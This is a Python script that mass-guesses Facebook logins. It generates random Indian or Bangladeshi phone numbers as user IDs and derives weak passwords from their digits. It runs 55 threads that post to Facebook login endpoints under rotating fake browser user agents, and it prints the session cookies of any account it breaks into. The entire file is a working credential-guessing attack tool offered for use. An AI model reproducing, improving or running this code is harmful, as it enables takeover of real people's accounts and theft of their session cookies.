import os,re,sys,uuid,random,requests,time,json
from concurrent.futures import ThreadPoolExecutor as ThreadPool


def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])

loop=0
oks=[]


logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻"""


#---HOST

#----------CK Update----------#





def main():
    user=[]
    os.system("clear")
    print(logo)
    print("—"*30)
    print("[1] India Random")
    print("[2] BD Random")
    print("—"*30)
    kkk=input("[✓] >")
    
    if "1" in kkk:
        pwx=["first6","57273200","first8","57575751","first10","59039200","last6","57575752"]
        print("—"*30)
        print(" CODE: 9848 9946 9832")
        print("—"*30)
        code=input("[!] -->")
        for i in range(10000):
            gg=str(random.choice(range(1000000,9999999)))
            user.append(gg)
    elif "2" in kkk:
        pwx=["first6","last6","first8","last8","last7","number"]
        print("—"*30)
        print(" CODE: 017 018 019 013")
        print("—"*30)
        code=input("[!] -->")
        for i in range(10000):
            gg=str(random.choice(range(10000000,99999999)))
            user.append(gg)
    else:main()
    with ThreadPool(max_workers=55) as update:
        os.system("clear")
        print(logo)
        print("—"*30)
        print(" [1] M.FACEBOOK")
        print(" [2] P.FACEBOOK")
        print(" [3] X.FACEBOOK")
        print(" [4] Mbasic.FACEBOOK")
        print(" [5] touch.Facebook")
        print("—"*30)
        p=input(" [+] Method: ")
        if p in ["1"]:
            fb="m"
        elif p in ["2"]:
            fb="p"
        elif p in ["3"]:
            fb="x"
        elif p in ["4"]:
            fb="mbasic"
        else:
            fb="touch"
        os.system("clear")
        print(logo)
        print("—"*30)
        print(f" Method : "+fb)
        print("  Used Code "+code)
        print("—"*30)
        for xd in user:
            uid=code+xd
            update.submit(host,uid,pwx,fb)





def host(uid,pwx,fb):
    global oks,loop
    session=requests.Session()
    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[HERON]   {loop}⟩\x1b[38;5;155m{str(len(oks))}\r "),
    sys.stdout.flush()
    
    try:
        for pw in pwx:
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            uax=windows()
            free_fb = session.get('https://m.facebook.com').text
            koki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            data={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            header={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': uax}
            url=f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            session.post(url,data=data,headers=header,cookies={'cookie': koki})
            heron_brand=session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1][:15].replace(";","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if 'Photoshop' in res:
                    print(f"\r\r[SUCCESSFUL] {uid} | {ps} | {coki}\n\n")
                break
            elif "checkpoint" in heron_brand:
                print(f"\r\r [CHECKPOINT] {uid} | {ps}")
            else:
                continue
        loop+=1
    except Exception as e:
       # print(e)
        time.sleep(10)



main()




























